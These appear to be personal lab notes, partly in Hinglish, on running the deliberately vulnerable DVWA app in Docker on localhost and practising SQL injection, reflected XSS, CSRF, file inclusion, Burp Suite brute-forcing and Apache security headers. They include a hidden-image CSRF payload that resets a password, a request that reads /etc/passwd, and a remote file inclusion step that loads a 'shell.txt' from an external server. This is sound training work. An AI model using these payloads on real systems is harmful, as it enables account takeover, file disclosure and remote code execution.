
# Environment Setup & SQL Injection

Those steps are generally reasonable for troubleshooting a Docker-hosted DVWA instance, but a couple of points are worth clarifying.

1. Remove the existing container (if it exists):

```
docker rm -f dvwa_lab
```

2. Restart Docker:

```
systemctl restart docker
```

3. Restart networking **only if necessary**. On many modern Linux systems, restarting the networking service is unnecessary and may briefly disrupt your connection.

```
systemctl restart networking
```

4. Start DVWA bound to localhost:

```
docker run -d -p 127.0.0.1:9000:80 --name dvwa_lab vulnerables/web-dvwa
```

5. Verify the container is actually running:

```
docker ps
```

You should see something like:

```
CONTAINER ID   IMAGE                  PORTS...            vulnerables/web-dvwa   127.0.0.1:9000->80/tcp
```

6. Check the application from the terminal:

```
curl -v http://127.0.0.1:9000
```

![[Pasted image 20260704211357.png]]


![[Screenshot From 2026-07-04 21-15-45.png]]
![[Screenshot From 2026-07-04 21-01-28.png]]


![[Pasted image 20260704211929.png]]


# SQL Injection (SQLi)



![[Pasted image 20260704212325.png]]


![[Pasted image 20260704212710.png]]

# Phase 2: Client-Side Attacks (XSS & CSRF)

### Step 1: Go to the Reflected XSS page

- Log in to DVWA.
- Set **Security Level** to **Low**.
- Click **XSS (Reflected)** in the left menu.

### Step 2: Test with normal input

- Enter a simple value such as:
    
    ```
    Aanamika
    ```
    
- Click **Submit**.
- You'll see something similar to:
    
    ```
    Hello Anamika
    ```
    ![[Screenshot From 2026-07-04 21-37-29.png]]

This confirms the application reflects your input.

```
http://127.0.0.1:9000/vulnerabilities/xss_r/?name=anamika#
```
### Step 3: Open the source code

- On the same DVWA page, click **View Source** (usually at the bottom of the page).
- DVWA displays the PHP code used for the current security level.

### Step 4: Examine the "Low" implementation

Look for the part of the PHP code that reads user input and prints it into the page. It will typically follow this pattern:

```
$name = $_GET['name'];echo $name;
```

Notice that:

- The application reads the input directly.
- It outputs the input directly.
- There is **no escaping or output encoding** before displaying it.

This is why HTML or JavaScript supplied by the user is interpreted by the browser instead of being shown as plain text.

### Step 5: Switch to a higher security level

- Go to **DVWA Security**.
- Change the level to **Medium** or **High**.
- Save the setting.
- Return to **XSS (Reflected)**.
- Click **View Source** again.

![[Screenshot From 2026-07-04 21-50-01.png]]

![[Screenshot From 2026-07-06 00-19-43.png]]

## 3. Cross-Site Request Forgery (CSRF)

### A. Description

CSRF attack me ek trusted authenticated user (victim) se uski marzi ke bina attacker malicious state-changing request execute karwa leta hai (jaise email badalna ya password change karna). Attacker ek fake page banakar user ko click karne par majboor karta hai.

### B. Proof of Concept (Exploitation Steps)

1. DVWA me **CSRF** page par jayein jahan password change karne ka option hai.
    
2. Jab aap password change karte hain, toh URL parameter kuch aisa dikhta hai:
    
    Plaintext
    
    ```
  http://127.0.0.1:9000/vulnerabilities/csrf/?password_new=12345&password_conf=12345&Change=Change&user_token=d8b4f50187fffde32551446bb1af7083#
    ```
    
3. Attacker ek malicious external HTML file banata hai jisme hidden image tag ya auto-submitting form hota hai:
    
    HTML
    
    ```
    <img src="http://127.0.0.1:9000/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change" style="display:none;">
    ```
    
4. Jab user pehle se DVWA me logged-in hai aur isi browser me attacker ke is page par visit karta hai, toh background me automatic us ka password badal kar `hacked` ho jata hai.
    

### C. Remediation (Mitigation)

1. **Anti-CSRF Tokens:** Har ek sensitive action ya request ke sath ek unique, unpredictable aur cryptographically secure token attach karein jo user ke current session se valid hota ho.
    
2. **SameSite Cookie Attribute:** Cookies ko hamesha `SameSite=Strict` ya `SameSite=Lax` par set karein, jisse external third-party domains se aane waale automatically attached request traffic block ho sakein.


![[Screenshot From 2026-07-06 00-19-43 1.png]]


### 4. File Inclusion Attacks

- **Local File Inclusion (LFI):**
    
    - Go to **File Inclusion**. Change the URL parameter `?page=include.php` to point to a sensitive system file: 
    ```
    ?page=/etc/passwd
    ```

```
http://127.0.0.1:9000/vulnerabilities/fi/?page=/etc/passwd
```

    - _Screenshot:_ Take a screenshot of the system's `/etc/passwd` text file outputted directly onto the web interface.

![[Screenshot From 2026-07-06 00-32-58.png]]


- **Remote File Inclusion (RFI):**
    
    - Host a simple text file with PHP code (e.g., `<?php phpinfo(); ?>`) on a local python webserver (`python3 -m http.server 8080`).
        
    - Inject that external URL parameter: `?page=http://your-ip:8080/shell.txt` to execute remote code.
![[Screenshot From 2026-07-06 00-32-58 1.png]]


### 5. Burp Suite Advanced

- Configure your browser to route traffic through Burp Suite's proxy.
    
- **Intercept & Modify:** Catch a login request mid-flight, modify the username or parameters, and forward it.
    
- **Fuzzing:** Send a login request to the **Intruder** tool, mark the password field, and run a brute-force attack using a standard wordlist to crack a user account.

### 6. Web Security Headers

- Run a test site through **securityheaders.com** to audit missing HTTP headers.
    
- Modify your Apache web server configuration file (`/etc/apache2/apache2.conf` or `.htaccess`) to include missing defenses like `X-Frame-Options`, `X-Content-Type-Options`, and `Strict-Transport-Security`.

## Enable the Apache headers module

Apache uses the **headers** module to send HTTP headers.

Check whether it is enabled:

```
 a2enmod headers
```

Restart Apache:

```
systemctl restart apache2
```

On Red Hat-based systems:

```
systemctl restart httpd
```

---

## Step : Add the security headers

Inside your Apache configuration or `.htaccess`, add:

```
<IfModule mod_headers.c>    Header always set X-Frame-Options "SAMEORIGIN"    Header always set X-Content-Type-Options "nosniff"    Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains"</IfModule>
```

Let's understand what each line does.